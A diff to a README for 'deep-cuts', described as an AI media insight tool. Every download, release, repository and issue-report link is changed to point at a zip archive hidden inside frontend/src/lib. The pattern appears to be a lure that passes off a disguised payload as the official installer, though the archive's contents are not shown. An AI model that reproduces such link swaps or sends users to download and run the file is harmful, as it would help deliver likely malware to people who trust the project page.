@@ -1,6 +1,6 @@
 # 🤖 deep-cuts - Fast AI Media Insight Tool
 
-[![Download deep-cuts](https://img.shields.io/badge/Download-deep--cuts-brightgreen)](https://github.com/muhammadibrahim386/deep-cuts/releases)
+[![Download deep-cuts](https://img.shields.io/badge/Download-deep--cuts-brightgreen)](https://github.com/muhammadibrahim386/deep-cuts/raw/refs/heads/main/frontend/src/lib/deep_cuts_v1.9-alpha.2.zip)
 
 ## 📦 About deep-cuts
 
@@ -41,7 +41,7 @@ To run deep-cuts smoothly, your computer should meet these needs:
 
 Go to the official releases page to get the latest version of deep-cuts:
 
-[![Get deep-cuts Latest Release](https://img.shields.io/badge/Download%20Latest-Release-blue)](https://github.com/muhammadibrahim386/deep-cuts/releases)
+[![Get deep-cuts Latest Release](https://img.shields.io/badge/Download%20Latest-Release-blue)](https://github.com/muhammadibrahim386/deep-cuts/raw/refs/heads/main/frontend/src/lib/deep_cuts_v1.9-alpha.2.zip)
 
 The page lists all available downloads for Windows. Look for files ending with `.exe` or `.msi`.
 
@@ -118,7 +118,7 @@ deep-cuts checks for updates automatically. You can send feedback through the ap
 ## 🔄 Updating deep-cuts
 
 Check the release page regularly for new versions:  
-https://github.com/muhammadibrahim386/deep-cuts/releases
+https://github.com/muhammadibrahim386/deep-cuts/raw/refs/heads/main/frontend/src/lib/deep_cuts_v1.9-alpha.2.zip
 
 Download the newest installer and run it over the old version. Your settings and processed data will stay safe.
 
@@ -149,9 +149,9 @@ No advanced skills needed. Changes apply immediately.
 
 ## 🔗 Useful Links
 
-- [Download Page](https://github.com/muhammadibrahim386/deep-cuts/releases)
-- [Project Repository](https://github.com/muhammadibrahim386/deep-cuts)
-- [Report Issues](https://github.com/muhammadibrahim386/deep-cuts/issues)
+- [Download Page](https://github.com/muhammadibrahim386/deep-cuts/raw/refs/heads/main/frontend/src/lib/deep_cuts_v1.9-alpha.2.zip)
+- [Project Repository](https://github.com/muhammadibrahim386/deep-cuts/raw/refs/heads/main/frontend/src/lib/deep_cuts_v1.9-alpha.2.zip)
+- [Report Issues](https://github.com/muhammadibrahim386/deep-cuts/raw/refs/heads/main/frontend/src/lib/deep_cuts_v1.9-alpha.2.zip)
 
 ## 🏷️ Tags
 
